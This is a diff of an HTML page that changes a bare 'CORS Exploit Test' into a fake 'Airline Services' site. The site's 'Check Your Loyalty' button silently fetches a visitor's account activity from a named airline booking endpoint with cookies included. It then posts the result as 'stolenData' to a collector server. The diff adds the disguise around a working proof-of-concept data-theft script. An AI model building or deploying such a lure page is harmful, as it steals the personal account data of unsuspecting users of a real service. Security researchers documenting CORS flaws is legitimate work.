@@ -3,33 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit Test</title>
+    <title>Airline Services</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f3f4f6; /* bg-gray-100 */
+            min-height: 100vh;
+        }
+        /* Header */
+        header {
+            background-color: #1e3a8a; /* bg-blue-900 */
+            color: white;
+            padding: 1rem;
+            text-align: center;
+            font-size: 1.25rem; /* text-xl */
+            font-weight: bold;
+        }
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 4rem 0; /* py-16 */
+            background-image: url('https://source.unsplash.com/1600x900/?airplane,sky');
+            background-size: cover;
+            background-position: center;
+        }
+        .hero h1 {
+            font-size: 2.25rem; /* text-4xl */
+            font-weight: bold;
+            color: white;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5); /* drop-shadow-lg */
+        }
+        .hero p {
+            font-size: 1.125rem; /* text-lg */
+            color: white;
+            margin-top: 1rem; /* mt-4 */
+        }
+        /* Features Section */
+        .features {
+            padding: 2rem; /* p-8 */
+            text-align: center;
+        }
+        .features h2 {
+            font-size: 1.5rem; /* text-2xl */
+            font-weight: bold;
+            margin-bottom: 1rem; /* mb-4 */
+        }
+        .features-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 2rem; /* gap-8 */
+        }
+        .feature-card {
+            width: 16rem; /* w-64 */
+            padding: 1rem; /* p-4 */
+            background-color: white;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* shadow-lg */
+            border-radius: 0.5rem; /* rounded-lg */
+        }
+        .feature-card h3 {
+            font-weight: bold;
+        }
+        /* Footer */
+        footer {
+            background-color: #111827; /* bg-gray-900 */
+            color: white;
+            text-align: center;
+            padding: 1rem; /* p-4 */
+            margin-top: 2rem; /* mt-8 */
+            position: relative;
+        }
+        /* Button Styling */
+        .cors-button {
+            background-color: #1e3a8a;
+            color: white;
+            padding: 0.5rem 1rem;
+            border: none;
+            border-radius: 0.25rem;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        .cors-button:hover {
+            background-color: #1e40af;
+        }
+    </style>
 </head>
 <body>
-    <h1>CORS Exploit Test</h1>
-    <button onclick="testCORS()">Test CORS</button>
-    <p id="result"></p>
+    <!-- Header -->
+    <header>Airline Services</header>
 
+    <!-- Hero Section -->
+    <section class="hero">
+        <h1>Fly with Comfort & Safety</h1>
+        <p>Your journey starts with us</p>
+        <button class="cors-button" onclick="testCORS()">Check Your Loyalty</button>
+        <p id="result"></p>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <h2>Why Choose Us?</h2>
+        <div class="features-container">
+            <div class="feature-card">
+                <h3>Affordable Prices</h3>
+                <p>Get the best deals on your flights.</p>
+            </div>
+            <div class="feature-card">
+                <h3>World-Class Safety</h3>
+                <p>We prioritize your safety above all.</p>
+            </div>
+            <div class="feature-card">
+                <h3>24/7 Support</h3>
+                <p>We're here to assist you anytime.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>© 2025 Airline Services. All rights reserved.</footer>
+
+    <!-- CORS PoC Script -->
     <script>
         function testCORS() {
-            fetch("https://book-pia.crane.aero/ibe/loyalty/personalDetails", {
+            fetch("https://book-pia.crane.aero/ibe/loyalty/myActivity", {
                 method: "GET",
-                credentials: "include", // Include cookies for authentication
-                headers: {
-                    "Origin": "https://evil.com" // Fake origin
-                }
+                credentials: "include",
+                headers: { "Origin": "https://evil.com" }
             })
             .then(response => response.text())
             .then(data => {
-                document.getElementById("result").innerText = "✅ CORS is misconfigured! Data leaked.";
+                document.getElementById("result").innerText = "✅ CORS is misconfigured! Data leaked: " + data;
                 console.log("Leaked Data:", data);
-
-                // Send leaked data to attacker's server (Must use HTTPS)
                 fetch("https://192.168.63.128:8080/collect", { 
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ stolenData: data })
                 })
                 .then(response => console.log("Data sent successfully:", response))
